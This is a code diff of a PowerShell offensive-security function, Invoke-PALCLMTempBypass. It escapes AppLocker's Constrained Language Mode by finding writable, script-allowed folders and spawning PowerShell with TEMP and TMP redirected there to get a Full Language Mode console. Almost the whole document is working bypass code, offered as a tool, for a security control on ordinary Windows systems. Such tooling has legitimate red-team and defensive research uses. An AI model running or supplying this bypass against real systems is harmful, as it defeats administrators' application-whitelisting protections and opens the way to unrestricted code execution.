@@ -1,6 +1,6 @@
+#Requires -Modules CimCmdlets
 Function Invoke-PALCLMTempBypass
 {
-#Requires -Modules CimCmdlets
 <#
 .SYNOPSIS
 
@@ -9,7 +9,7 @@ This results in a Full Language Mode Powershell console.
 
 Author: @oddvarmoe
 License: BSD 3-Clause
-Required Dependencies: Get-PALRules, Get-PALWriteablepaths
+Required Dependencies: Get-PALWriteableAllowedPaths
 Optional Dependencies: None
 
 .DESCRIPTION
@@ -23,9 +23,11 @@ If you specify $AllowedPath it will not enumerate the rules and figure out writa
 locations. Instead it will try to spawn Powershell with the %temp% and %tmp% pointing to
 that location.
 
+Use $ExecutionContext.SessionState.LanguageMode to check language mode
+
 .PARAMETER AllowedPath
 
-Path to a location where execution of scripts is allowed and the user has write access to. 
+Instead of enumerating you can supply a path to a location where you know that execution of scripts is allowed and the user has write access to. 
 
 .PARAMETER PoshStartParms
 
@@ -58,6 +60,9 @@ ProcessId ReturnValue PSComputerName
 --------- ----------- --------------
      6092           0
 #>
+
+# Function Version: 1.0
+
 [CmdletBinding()] Param (
         [String]
         $AllowedPath,
@@ -71,84 +76,26 @@ ProcessId ReturnValue PSComputerName
         {
             $InjectiblePaths = @()
 
-            if($AllowedPath){
+            if($AllowedPath)
+            {
                 "`n[*] Path specified - Trying bypass from that path"
                 $InjectiblePaths += $AllowedPath
             }
-            else{
-
-                "`n[*] Finding suitable script rule location - Be patient - Takes time the first time you run it!"
-                $rules = Get-PALRules -OutputRules Path -RuleActions Allow
-                $denyrules = Get-PALRules -OutputRules Path -RuleActions Deny
-                        
-                foreach($rul in $rules){
-                    if($rul.Name -eq "Script"){
-                        foreach($path in $rul.RulesList.path){
-                            $InjectiblePaths += Get-PALWriteablepaths -Path $path
-                        }
-                    }
-                }
-            }
-
-
-            # All exceptions
-            $exceptions = @()
-            $rulesexception = foreach($ex in $rules[($rules.Name.IndexOf("Script"))].Ruleslist)
-            {
-                if($ex.PathExceptions)
-                {
-                    Write-Verbose "Exceptions found - Adding to list"
-                    foreach($den in $rules[($rules.Name.IndexOf("Script"))].RulesList.PathExceptions)
-                    {
-                        $Exceptions += $den
-                    }
-                }
-                else
-                {
-                    Write-Verbose "No Exceptions found"
-                }
-            }
-
-            if($denyrules)
-            {
-                Write-Verbose "Deny rules found - Adding to list"
-                foreach($denr in $denyrules[($denyrules.Name.IndexOf("Script"))].ruleslist)
-                {
-                    $Exceptions += $denr
-                }
-            }
             else
             {
-                Write-Verbose "No deny rules found"
+                "`n[*] Finding suitable script rule location - Be patient - Takes time the first time you run it per session, since it calculates all writable paths!"
+                #A bug... Needs to run it once before I can use rulesection and get the correct count
+                #must be something related to global variables
+                Get-PALWriteableAllowedPaths | Out-Null
+                $InjectiblePaths += Get-PALWriteableAllowedPaths -RuleSection Script
             }
 
-            # remove exceptions and deny rules from the list - those are explicit deny
-            $InjectiblePathsCleaned = @()
-            Foreach($pth in $InjectiblePaths)
+            if($InjectiblePaths)
             {
-                $Remove = $false
-                foreach($rem in $exceptions)
-                {
-                    if($rem -like "*$pth*")
-                    {
-                        $Remove = $true
-                        break
-                    }
-                }
-
-                #Only add path to list if it is not in exceptions
-                if(!($Remove))
-                {
-                    $InjectiblePathsCleaned += $pth
-                }
-            }
-            
-            if($InjectiblePathsCleaned)
-            {
-                $RandomScriptAllowedPath = $InjectiblePathsCleaned[(Get-Random -Minimum 0 -Maximum $InjectiblePathsCleaned.Count)]
-                "`[*] Found paths $InjectiblePathsCleaned"
-                "`[*] Random path picked: $RandomScriptAllowedPath"
-                "`[*] Launching Powershell with TEMP/TMP set to: $RandomScriptAllowedPath"
+                $RandomScriptAllowedPath = $InjectiblePaths[(Get-Random -Minimum 0 -Maximum $InjectiblePaths.Count)]
+                "`[*] Found $($InjectiblePaths.count) paths"
+                "`[*] Random path picked: $($RandomScriptAllowedPath.Path)"
+                "`[*] Launching Powershell with TEMP/TMP set to: $($RandomScriptAllowedPath.Path)"
                 $TEMPBypassPath = $RandomScriptAllowedPath
                 $TMPBypassPath = $RandomScriptAllowedPath
                 
@@ -161,8 +108,8 @@ ProcessId ReturnValue PSComputerName
                 }
 
                 [String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
-                $TEMPBypassPath = "Temp=$RandomScriptAllowedPath"
-                $TMPBypassPath = "TMP=$RandomScriptAllowedPath"
+                $TEMPBypassPath = "Temp=$($RandomScriptAllowedPath.Path)"
+                $TMPBypassPath = "TMP=$($RandomScriptAllowedPath.Path)"
                 $EnvVarsExceptTemp += $TEMPBypassPath
                 $EnvVarsExceptTemp += $TMPBypassPath
                 
@@ -177,7 +124,7 @@ ProcessId ReturnValue PSComputerName
             }
             else
             {
-                Write-Verbose "No path found, bypass not possible"
+                Write-Verbose "No path found, bypass not possible :-("
             }
         }
         Catch
